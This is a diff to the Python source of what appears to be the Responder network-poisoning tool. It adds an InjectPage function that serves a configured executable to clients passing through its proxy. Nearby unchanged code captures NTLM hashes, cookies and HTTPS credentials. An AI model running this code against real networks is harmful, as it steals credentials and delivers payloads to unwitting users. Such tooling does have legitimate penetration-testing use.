@@ -79,6 +79,7 @@ Exe_On_Off = config.get('HTTP Server', 'Serve-Exe').upper()
 Exec_Mode_On_Off = config.get('HTTP Server', 'Serve-Always').upper()
 FILENAME = config.get('HTTP Server', 'Filename')
 WPAD_Script = config.get('HTTP Server', 'WPADScript')
+HTMLToServe = config.get('HTTP Server', 'HTMLToServe')
 RespondTo = config.get('Responder Core', 'RespondTo').strip()
 RespondTo.split(",")
 RespondToName = config.get('Responder Core', 'RespondToName').strip()
@@ -95,6 +96,9 @@ INTERFACE = options.INTERFACE
 Verbose = options.Verbose
 Force_WPAD_Auth = options.Force_WPAD_Auth
 AnalyzeMode = options.Analyse
+
+if HTMLToServe == None:
+    HTMLToServe = ''
 
 if INTERFACE != "Not set":
     BIND_TO_Interface = INTERFACE
@@ -1617,7 +1621,6 @@ def Basic_Ntlm(Basic):
 
 def ServeEXE(data,client, Filename):
     Message = "[+]Sent %s file sent to: %s."%(Filename,client)
-    print Message
     logging.warning(Message)
     with open (Filename, "rb") as bk:
         data = bk.read()
@@ -1704,7 +1707,7 @@ def PacketSequence(data,client):
                 buffer1 = WpadCustom(data,client)
                 return buffer1
             else:
-                buffer1 = IIS_Auth_Granted(Payload=config.get('HTTP Server','HTMLToServe'))
+                buffer1 = IIS_Auth_Granted(Payload=HTMLToServe)
                 buffer1.calculate()
                 return str(buffer1)
 
@@ -1724,7 +1727,7 @@ def PacketSequence(data,client):
             buffer1 = WpadCustom(data,client)
             return buffer1
         else:
-            buffer1 = IIS_Auth_Granted(Payload=config.get('HTTP Server','HTMLToServe'))
+            buffer1 = IIS_Auth_Granted(Payload=HTMLToServe)
             buffer1.calculate()
             return str(buffer1)
 
@@ -1778,8 +1781,21 @@ def HandleGzip(Headers, Content, Payload):
     else:
         return False
 
+def InjectPage(data, client):
+    if ServeEXECAlwaysOrNot(Exec_Mode_On_Off):
+        if IsExecutable(FILENAME):
+            buffer1 = ServeAlwaysExeFile(Payload = ServeEXE(data,client,FILENAME),ContentDiFile=FILENAME)
+            buffer1.calculate()
+            return str(buffer1)
+        else:
+            buffer1 = ServeAlwaysNormalFile(Payload = ServeEXE(data,client,FILENAME))
+            buffer1.calculate()
+            return str(buffer1)
+    else:
+        return False
+
 def InjectData(data):
-    Payload = config.get('HTTP Server','HTMLToServe')
+    Payload = HTMLToServe
     if len(data.split('\r\n\r\n'))>1:
         try:
             Headers, Content = data.split('\r\n\r\n')
@@ -1906,8 +1922,10 @@ class ProxyHandler (BaseHTTPServer.BaseHTTPRequestHandler):
                     if i is soc:
                         out = self.connection
                         try:
-                            if len(config.get('HTTP Server','HTMLToServe'))>5:
+                            if len(HTMLToServe)>5:
                                 data = InjectData(i.recv(8192))
+                            if InjectPage(i.recv(8192),self.client_address[0]):
+                                data = InjectPage(i.recv(8192),self.client_address[0])
                             else:
                                 data = i.recv(8192)
                         except:
@@ -2011,7 +2029,7 @@ def HTTPSPacketSequence(data,client):
         if packetNtlm == "\x03":
             NTLM_Auth= b64decode(''.join(a))
             ParseHTTPSHash(NTLM_Auth,client)
-            buffer1 = str(IIS_Auth_Granted(Payload=config.get('HTTP Server','HTMLToServe')))
+            buffer1 = str(IIS_Auth_Granted(Payload=HTMLToServe))
             return buffer1
     if b:
         GrabCookie(data,client)
@@ -2019,7 +2037,7 @@ def HTTPSPacketSequence(data,client):
         WriteData(outfile,b64decode(''.join(b)), b64decode(''.join(b)))
         print "[+]HTTPS-User & Password:", b64decode(''.join(b))
         logging.warning('[+]HTTPS-User & Password: %s'%(b64decode(''.join(b))))
-        buffer1 = str(IIS_Auth_Granted(Payload=config.get('HTTP Server','HTMLToServe')))
+        buffer1 = str(IIS_Auth_Granted(Payload=HTMLToServe))
         return buffer1
 
     else:
